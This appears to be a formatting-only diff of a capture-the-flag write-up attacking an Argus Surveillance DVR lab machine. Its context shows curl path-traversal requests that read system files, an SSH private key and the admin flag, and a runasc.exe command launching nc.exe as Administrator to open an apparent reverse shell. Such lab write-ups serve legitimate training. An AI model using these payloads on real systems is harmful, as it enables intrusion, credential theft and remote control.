@@ -32,7 +32,7 @@ SSH is open on this Windows machine, so let's take note of that.
 
 Port 8080 hosted an Argus Surveillance instance:
 
-<figure><img src="../../../.gitbook/assets/image (1766).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1766).png>)
 
 There are quite a few exploits for this software:
 
@@ -50,7 +50,6 @@ Argus Surveillance DVR 4.0.0.0 - Privilege Escalation      | windows_x86/local/4
 
 The LFI one looks the easiest to exploit, and it involves using `curl`:
 
-{% code overflow="wrap" %}
 ```
 $ curl "http://192.168.201.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
 
@@ -68,11 +67,10 @@ timer=timer.drv
 
 [mci]
 ```
-{% endcode %}
 
 It works, so now we just need to find out what to read. I know that SSH is open, so we should be looking for a SSH private key of some user. On the website, we can view the users to see 2:
 
-<figure><img src="../../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(96).png>)
 
 `viewer` is one them, and we can try to read their private key:
 
@@ -88,7 +86,7 @@ Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP
 
 Using this, we can `ssh` into the machine as `viewer`:
 
-<figure><img src="../../../.gitbook/assets/image (3135).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3135).png>)
 
 ## Privilege Escalation
 
@@ -96,12 +94,10 @@ Using this, we can `ssh` into the machine as `viewer`:
 
 I tested the LFI in reading the administrator flag, and it actually worked:
 
-{% code overflow="wrap" %}
 ```
 $ curl "http://192.168.201.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FAdministrator%2FDesktop%2fproof.txt&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
 <FLAG>
 ```
-{% endcode %}
 
 This means that the application is being run by the administrator instead of `viewer`. There were other exploits that we didn't use yet. I found that the Weak Password Encryption was one of them. This involved reading the password hash from the configuration files of Argus.
 
@@ -173,4 +169,4 @@ C:\Windows\Tasks>.\runasc.exe Administrator 14WatchD0g$ "C:\Windows\Tasks\nc.exe
 92.168.45.191 21"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1092).png>)
